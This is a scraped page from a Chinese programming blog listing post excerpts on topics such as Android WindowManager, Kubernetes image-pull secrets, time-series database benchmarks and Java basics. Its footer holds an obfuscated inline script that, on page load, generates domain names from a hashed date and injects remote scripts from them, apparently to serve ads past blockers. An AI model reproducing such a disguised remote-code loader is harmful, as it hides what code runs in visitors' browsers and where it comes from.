返回消息，用箭头虚线，表示一个对象，收到另一个对象的信息后，再向其返回的信息，或做的事情。
消息线上方的文字，则是注明传递的消息或执行的动作，一般用动宾短语。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d185778884f4455e1cd0d18879fbb45a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e6335a451d6f5068e66b46a503df659a/" rel="bookmark">
			写入性能：TDengine 最高达到 InfluxDB 的 10.3 倍，TimeScaleDB 的 6.74 倍
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		上周三，TDengine 正式发布了基于 TSBS 的时序数据库（Time Series Database，TSDB）性能基准测试报告，该报告采用 TSBS 平台中针对 DevOps 的场景作为基础数据集，在相同的 AWS 云环境下对 TDengine 3.0、TimescaleDB 2.6 和 InfluxDB 1.8 进行了对比分析。为了便于大家更好地阅读和理解，基于报告内容，我们将从写入、查询及测试过程如何复现等几大维度输出系列文章。本篇文章将为大家解读三大时序数据库在写入性能上的差异点。
在《TSBS 是什么？为什么 TDengine 会选择它作为性能对比测试平台？》一文中，我们对测试场景和基本配置已经进行了详细介绍，本篇文章便不再赘述，还没有了解过的小伙伴可以点击上文链接查看。
五大场景下，TDengine 写入性能实现全面超越 不同场景下写入性能的对比（metrics/sec. 数值越大越好）
如上图所示，我们可以看到在全部五个场景中，TDengine 的写入性能全面超越了 TimescaleDB 和 InfluxDB。在场景二中 TDengine 写入性能最大达到了 TimescaleDB 的 6.74 倍，在差距最小的场景五中，TDengine 也是 TimescaleDB 的 1.52 倍。相比 InfluxDB，TDengine 在场景五中写入性能达到 InfluxDB 的 10.63 倍，在差距最小的场景一中也有 3.01 倍，具体的倍率关系请参见下表。
TDengine/InfluxDB
TDengine/TimescaleDB
100 devices × 10 metrics
301.41%
585.63%
4,000 devices × 10 metrics
489.69%
674.12%
100,000 devices × 10 metrics
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e6335a451d6f5068e66b46a503df659a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7ded01debee87a76a8d919b920f49e8f/" rel="bookmark">
			源码学习时间，Window Manager in Android
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		/ 今日科技快讯 /
近日消息，京东百亿补贴被曝已开始少量上线测试，已有用户可看到活动页面！据网友反馈，京东部分商品现已有“百亿补贴”的标签，目前上线的商品包括手机、家电、酒水、食品、服饰等众多品类。
/ 作者简介 /
大家周五好，咱们下周再见，祝大家周末愉快！
本篇文章转自小余的自习室的博客，文章主要分享了Android WindowManager体系的讲解，相信会对大家有所帮助！
原文地址：
https://juejin.cn/post/7166157765570723871
/ 前言 /
大家好，由于工作和面试需要，笔者结合大佬们的经验以及自身对源码理解，写了一篇关于Android framework层：WindowManager体系的讲解。
本篇是Android framework的第一讲，重在讲解Window在被添加到WindowManagerService前的流程。
/ WindowManager体系 /
Android中的窗口体系可以分为下面三部分：
1. Window：可以简单理解为一个窗口，这个窗口承载了需要绘制的View，他是一个抽象类，具体实现类是PhoneWindow。
2. WindowManager：也是一个接口类，继承ViewManager，用来对Window进行管理， 实现类：WindowManagerImpl，其对Window的操作具体是通过WMS来实现的。理解为一个app层面的WMS和Window的中间人。
3. WindowManagerService(WMS)：是系统服务中的一重要成员，WindowManager和WMS通过binder进行通讯，真正对Window添加，更新，删除等操作的执行者。
三者之间关系：
前面分析了窗口体系中的类关系，下面我们从源码角度和分析下：
为了大家不会迷路在源码中，笔者会根据面试中可能被问到的几个问题出发，有目的性的介绍。
问题1：Window和Activity以及WindowManager什么时候建立的关系？
问题2：Window什么时候和View进行关联？
问题3：Window有哪些属性？类型？层级关系？z-order？Window标志？软键盘模式都了解么？
问题4：View是如何一步一步添加到屏幕上的？更新？删除呢？
那么就开始我们的源码（mo）遨（yu）游吧。
1.Window和Activity以及WindowManager什么时候建立的关系？
前面几篇文章我们分析过：Activity在启动的过程中，会调用它的attach方法进行Window的创建。那就直接定位到Activity的attach方法：
final void attach(Context context, ActivityThread aThread, Instrumentation instr, IBinder token, int ident, Application application, Intent intent, ActivityInfo info, CharSequence title, Activity parent, String id, NonConfigurationInstances lastNonConfigurationInstances, Configuration config, String referrer, IVoiceInteractor voiceInteractor, Window window, ActivityConfigCallback activityConfigCallback) { attachBaseContext(context); .
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7ded01debee87a76a8d919b920f49e8f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9f4781ea17c7665b14c447ecb1cba8ce/" rel="bookmark">
			拉取私有仓库镜像配置
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		拉取私有仓库镜像配置 当我们制作好一个镜像后，我们可以传到公共镜像仓库，供所有人拉取使用，不需要指定拉取镜像的用户、密码。我们也可以将镜像推送到自己搭建的镜像库，比如harbor镜像仓库中，如果我们在镜像仓库中的项目是公开项目，拉取镜像也是不要用户名、密码的。但如果是私有项目，则需要指定用户名、密码才能拉取。下面将介绍两种方式通过用户名、密码拉取私有镜像
制作拉取镜像secret 不论是何种姿势拉取私有镜像，都需要先创建拉取镜像的secret。创建拉取镜像secret有两种方式，如下
根据config.json文件生成secret docker login登录到镜像需要推到的目标仓库，此时在本地/root/.docker目录下会生成一个config.json文件，config.json文件包含登录镜像仓库
认证信息
将config.json文件编码成base64,执行下面命令
base64 -w 0 /root/.docker/config.json 创建下面的secret yaml文件
apiVersion: v1 data: .dockerconfigjson: 第二步中生成的Base64编码 kind: Secret metadata: name: secret名称 namespace: 命名空间 type: kubernetes.io/dockerconfigjson 执行下面命令创建secret
kubectl apply -f secret文件名 -n 命名空间 直接通过用户名、密码创建secret 执行下面命令创建secretkubectl create secret docker-registry secret名称 --docker-server=仓库地址 --docker-username=用户名 --docker-password=密码 --docker-email=邮箱地址（如果没有可以不指定）-n 命名空间 使用制作的secret拉取镜像 通过上面的方式创建完secret之后，我们接下来使用这个secret来拉取私有镜像。有两种方式可供使用
直接在拉取镜像的资源yaml中指定拉取镜像secret 如果我们自己维护的yaml资源，我们完全可以在制作yaml文件时直接通过imagePullSecrets指定拉取镜像的secret
apiVersion: v1 kind: Pod metadata: name: private-pod spec: imagePullSecrets: - name: secret名称 containers: - image: 镜像仓库地址 name: main 通过ServiceAccount指定拉取镜像secret 除上述直接在资源中通过imagePullSecrets指定拉取镜像的secret外，也可以通过ServiceAccount的imagePullSecrets属性间接设置资源拉取镜像的secret。k8s yaml资源文件
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9f4781ea17c7665b14c447ecb1cba8ce/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4a18959c2f3a17cd822c1c9a406c5c55/" rel="bookmark">
			团队API管理工具-YAPI
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		团队API管理工具-YAPI 推荐一款接口管理平台，操作简单、界面友好、功能丰富、支持markdown语法、可使用Postman导入、Swagger同步数据展示、LDAP、权限管理等功能。
YApi是高效、易用、功能强大的api管理平台，旨在为开发、产品、测试人员提供更优雅的接口管理服务。可以帮助开发者轻松创建、发布、维护API，YApi还为用户提供了优秀的交互体验，开发人员只需利用平台提供的接口数据写入工具以及简单的点击操作就可以实现接口的管理。
特性 基于 Json5 和 Mockjs 定义接口返回数据的结构和文档，效率提升多倍扁平化权限设计，即保证了大型企业级项目的管理，又保证了易用性类似 postman 的接口调试自动化测试, 支持对 Response 断言MockServer 除支持普通的随机 mock 外，还增加了 Mock 期望功能，根据设置的请求过滤规则，返回期望数据支持 postman、har、swagger、json 数据导入基于mongodb数据库做数据持久化存储免费开源，长期维护，内网部署 成员管理 接口管理 历史操作记录 数据管理(导入/导出) 支持swagger同步
支持自动化测试、mock测试 支持LDAP管理 K8s编排部署 apiVersion: apps/v1 kind: Deployment metadata: labels: app: yapi name: yapi namespace: default spec: revisionHistoryLimit: 3 selector: matchLabels: app: yapi template: metadata: labels: app: yapi spec: restartPolicy: Always containers: - name: yapi image: jayfong/yapi:1.10.2 imagePullPolicy: Always ports: - containerPort: 3000 name: yapi protocol: TCP env: # 管理员账号 - name: YAPI_ADMIN_ACCOUNT value: "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4a18959c2f3a17cd822c1c9a406c5c55/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e15d8aa32eea0caa6bf93ac036b14ff4/" rel="bookmark">
			数据结构———队列的顺序实现
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		#define MaxSize 100 #define ElemType int typedef struct { ElemType data[MaxSize]; int front, rear; }SeqQueue; void InitQueue(SeqQueue &amp;Q){ Q.front = Q.rear = 0;//队尾指针指向最后一个元素的后一个内存单元 //队头指针指向首元素的下标 } bool EnQueue(SeqQueue &amp;Q, ElemType e){ if (Q.rear == MaxSize)//判断是否队满 return false; Q.data[Q.rear++] = e; return true; } bool DeQueue(SeqQueue &amp;Q, ElemType &amp;e){ if (Q.front == Q.rear)//判断队空 return false; e = Q.data[Q.front++]; return true; } /*以上是顺序队列，容易发生假溢出的情况，通常情况下不采用该写法*/ void InintQueue(SeqQueue &amp;Q){ Q.front = Q.rear = 0;//队尾指针指向最后一个元素的后面一个内存单元。队头指针指向首元素的下标 } bool EnQueue(SeqQueue &amp;Q, ElemType e){ if ((Q.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e15d8aa32eea0caa6bf93ac036b14ff4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/658677ea609d7e0ba4b52e81b3b6113a/" rel="bookmark">
			astype(‘datetime64[M]‘)无效的问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在跟着学习一个视频的时候，发现自己用 astype(‘datetime64[M]’) 不好使，并没有像视频那样，month列精确到了月份。
视频所示： 我的: 修改之后的 原来只需要在中间加一个values就好了
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/56a0568f0bcd2a2ff4564c41cef156d5/" rel="bookmark">
			javaSE之类和对象(1)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		javaSE之类和对象(1) 🍓🍓
文章目录 javaSE之类和对象(1)一丶初识面向对象面向对象的概念 二丶类和对象1.类2.对象3.值得注意的是: 三丶类的成员1.字段/属性/成员变量2.方法3.static关键字修饰属性修饰方法👉 👉 值得注意的是 一丶初识面向对象 面向对象的概念 🍁🍁通俗的理解就是把我们看到的事物都当成一个对象，每个对象都有自己的属性和用途，比如一个冰箱，它的属性就是高度，宽度，容量，它的方法就是，制冷，保鲜等。再比如一头大象，它的属性就是重量，高度等，它的方法就是吃东西或者被装进冰箱等。面向对象编程就是把对象与对象之间的交互与联系表示出来，达到我们想要的效果，再比如想要把大象装进冰箱，首先我们要有两个对象，一个是冰箱一个是大象，通过冰箱的冷藏方法和大象的被装进冰箱的方法之间的交互完成的。
二丶类和对象 1.类 📣📣类：类就是图纸，我们想要得到对象，就需要先构造一个图纸作为模板，然后通过图纸，来获得对象的实例。其中图纸的内容就是属性丶方法丶代码块等.
下面我们如果定义一个类
class People{ int height = 160; double weight =65; public void eat(){ System.out.println("吃饭"); } } 其中class就是定义一个类的标志,people就是这个类的名字,定义在{}内部的height和weight就是 这个的类属性,eat()就是这个类的方法.
2.对象 🌲🌲对象:对象就是将图纸上的内容,给造出来,得到的具体个体,抽象到java语言中,也就是通过类得到一个实例体,我们可以真正的使用这个实例的方法和属性,并且可以修改
public static void main(String[] args) { People pp = new People();//此处就是实例对象,通过new来得到,pp就是这个对象的名字,People就是这个对象得类 System.out.println(pp.height); System.out.println(pp.weight); pp.eat();//使用对象的方法和属性,都是通过'.'的操作来实现 } 对象的实例化,我们可以在类里面进行,也可以在方法里面进行,这里没有限制.
3.值得注意的是: 1.一个类可以实例化多个对象
2.实例化得到的对象会占据实际意义上的物理空间
3.实例化得到的对象,不是同一个对象,即使属性方法完全一样,但是在物理空间中也是两个物体,可以理解为双胞胎或者多胞胎.他们在计算机中占据的地址也是不相同的
4.没有定义静态属性或者静态方法,不能直接操作类,一定要先实例化
三丶类的成员 1.字段/属性/成员变量 📧📧上文我们讲的属性,也可以被称作字段或者成员变量,一般不会严格区分.是用来描述类中包含了哪些属性
1.这里的属性不仅可以包含基本数据类型也可以包含引用数据类型
2.对于一般的属性,我们可以赋值,也可以不赋值.但是比如int类型,不赋值就默认为1,引用型数据类型,默认为null
3.当默认为null的引用型数据出现时,我们要特别注意,如果不小心使用了就会出现空指针异常的错误
class Person { public String name; public int age; } class Test { public static void main(String[] args) { Person person = new Person(); System.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/56a0568f0bcd2a2ff4564c41cef156d5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/54d86c5e5be3109b65dec5b0d4208eca/" rel="bookmark">
			VMware虚拟机安装centos（超详细图文教程）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		VMware虚拟机安装centos 1 centos下载2 打开VMware3 选择镜像4 开机5 reboot 重启6 根据几步简单图示操作即可大功告成！ 1 centos下载 Ubuntu下载地址：点这里
下载不成功的也可关注WX公众号Time木回复: centos 获取
2 打开VMware VMware安装过程：待更新
2.1 创建新的虚拟机
2.2 一般情况都会选择典型（如果这里有需要选择自定义的一般也不会看教程了，哈哈哈）
2.3 选择稍后安装操作系统，然后下一步。
2.4 如图
选择和你镜像相匹配的继续下一步
2.5 1和1 也够基本用了，多了自然更够用
2.6 一般选择2G
2.7 如图
2.8 如图，推荐就行
2.9 如图推荐就行
、
2.10 如图
2.11 如图，20往上大都可以
2.12 如图，名字可改可不改，我这里加了点。
2.13 点击完成
3 选择镜像 3.1 编辑虚拟机设置
3.2 浏览选择下载的镜像地址，然后确定
4 开机 4.1 选红框处enter可以，不动不选，等会自己也会自动进。
4.2 这里可以选择语言，想学英语，想有英语环境的可以不选中文。
4.3 时间和日期点进去 选择上海。（忘截图了）
红框处点进去，按图示操作。最后Done
4.4 打开安装位置,按照图示操作。
后面都直接点Done不用管其他的。
4.5 点击图中红框
按照图示选择然后Done。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/54d86c5e5be3109b65dec5b0d4208eca/">Read more…</a>
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/page/172/">«</a>
	<span class="pagination__item pagination__item--current">173/578</span>
	<a class="pagination__item pagination__item--next btn" href="/page/174/">»</a>
</div>

			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程随想.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151182"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>